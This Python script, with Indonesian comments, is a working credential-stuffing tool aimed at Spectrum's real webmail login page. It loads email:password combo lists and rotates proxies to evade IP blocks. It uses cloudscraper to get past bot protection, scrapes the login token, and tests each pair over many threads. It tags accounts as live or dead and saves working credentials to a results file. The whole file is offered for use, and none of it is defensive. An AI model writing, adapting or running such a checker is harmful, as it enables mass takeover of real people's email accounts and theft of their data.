import cloudscraper
import random
import time
import os
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from colorama import Fore, init

# Inisialisasi warna terminal
init(autoreset=True)

class ValosintUltimate:
    def __init__(self):
        self.valid_count = 0
        self.bad_count = 0
        self.retry_count = 0
        self.lock = threading.Lock()

    def _get_time(self):
        return datetime.now().strftime("%H:%M:%S")

    def _display_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.CYAN}██    ██  █████  ██       ██████  ███████ ██ ███    ██ ████████ ")
        print(f"{Fore.CYAN}██    ██ ██   ██ ██      ██    ██ ██      ██ ████   ██    ██    ")
        print(f"{Fore.CYAN}██    ██ ███████ ██      ██    ██ ███████ ██ ██ ██  ██    ██    ")
        print(f"{Fore.CYAN} ██  ██  ██   ██ ██      ██    ██      ██ ██ ██  ██ ██    ██    ")
        print(f"{Fore.CYAN}  ████   ██   ██ ███████  ██████  ███████ ██ ██   ████    ██    ")
        print(f"\n               {Fore.WHITE}spectrum_auditor • VALOSINT ULTIMATE")
        print(f"              {Fore.CYAN}◇ STRICT LOGIC ◇ ANTI-FALSE LIVE ◇")
        print(f"\n                         {Fore.BLUE}╭──────────────╮")
        print(f"                         {Fore.CYAN}│ {Fore.WHITE}PROJECT_VALO {Fore.CYAN}│")
        print(f"                         {Fore.BLUE}╰──────────────╯")
        print(f"{Fore.BLUE}──────────────────────────────────────────────────────────────────────")

    def check_account(self, credential, proxies):
        if ":" not in credential: return
        email, password = credential.split(":")
        px = random.choice(proxies) if proxies else None
        px_map = {"http": f"http://{px}", "https": f"http://{px}"} if px else None
        
        try:
            target_url = "https://webmail.spectrum.net/index.php/mail/auth"
            scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows'})
            
            # 1. Get Token & Cookies
            res_get = scraper.get(target_url, proxies=px_map, timeout=15)
            soup = BeautifulSoup(res_get.text, 'html.parser')
            token = soup.find('input', {'type': 'hidden'})['value'] if soup.find('input', {'type': 'hidden'}) else ""

            # 2. Login Request
            payload = {'email': email, 'password': password, 'token': token, 'login': 'submit'}
            res = scraper.post(target_url, data=payload, proxies=px_map, timeout=15, allow_redirects=True)
            
            ts = self._get_time()
            content = res.text.lower()
            url = res.url.lower()

            with self.lock:
                # --- LOGIKA VALIDASI KETAT ---
                
                # A. Cek GAGAL (DIE)
                if "doesn't match our records" in content or "invalid" in content or "incorrect" in content:
                    print(f"{Fore.RED}[{ts}] [DIE]    {email} | Wrong Password")
                    self.bad_count += 1

                # B. Cek SUKSES (LIVE) - Syarat: URL harus keluar dari /auth dan ada sinyal dashboard
                elif "/auth" not in url and ("inbox" in url or "mail" in url or "signout" in content):
                    print(f"{Fore.GREEN}[{ts}] [LIVE]   {email} | {password}")
                    if not os.path.exists("results"): os.makedirs("results")
                    with open("results/live.txt", "a") as f: f.write(f"{email}:{password}\n")
                    self.valid_count += 1

                # C. Cek RETRY (Server Busy / Rate Limit)
                elif res.status_code in (429, 503) or "too many requests" in content:
                    print(f"{Fore.YELLOW}[{ts}] [RETRY]  {email} | Rate Limited")
                    self.retry_count += 1

                # D. Cek BLOCKED (Access Denied)
                elif res.status_code == 403 or "captcha" in content:
                    print(f"{Fore.MAGENTA}[{ts}] [BLOCK]  {email} | IP Blocked/Captcha")
                    self.retry_count += 1

                # E. Unknown
                else:
                    print(f"{Fore.WHITE}[{ts}] [UNK]    {email} | Unknown Response")
                    self.retry_count += 1

        except Exception:
            with self.lock:
                print(f"{Fore.YELLOW}[{self._get_time()}] [ERROR]  {email[:15]}... | Connection Failed")
                self.retry_count += 1

    def start(self):
        self._display_banner()
        combo_file = input(f"{Fore.WHITE}[?] Combo File: ").strip() or "combo.txt"
        proxy_file = input(f"{Fore.WHITE}[?] Proxy File (Enter u/ No Proxy): ").strip()
        threads = int(input(f"{Fore.WHITE}[?] Threads: ") or "5")

        if not os.path.exists(combo_file):
            print(f"{Fore.RED}[!] File {combo_file} tidak ditemukan!"); return

        accounts = [l.strip() for l in open(combo_file, 'r', encoding='utf-8') if ":" in l]
        proxies = [l.strip() for l in open(proxy_file, 'r', encoding='utf-8')] if os.path.exists(proxy_file) else []

        print(f"\n{Fore.GREEN}[√] SYSTEM READY. STARTING SCAN...\n")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for acc in accounts:
                executor.submit(self.check_account, acc, proxies)

        print(f"\n{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
        print(f"{Fore.GREEN} [+] LIVE: {self.valid_count}  {Fore.RED}[-] DIE: {self.bad_count}  {Fore.YELLOW}[!] RETRY: {self.retry_count}")
        print(f"{Fore.BLUE}──────────────────────────────────────────────────────────────────────")

if __name__ == "__main__":
    ValosintUltimate().start()
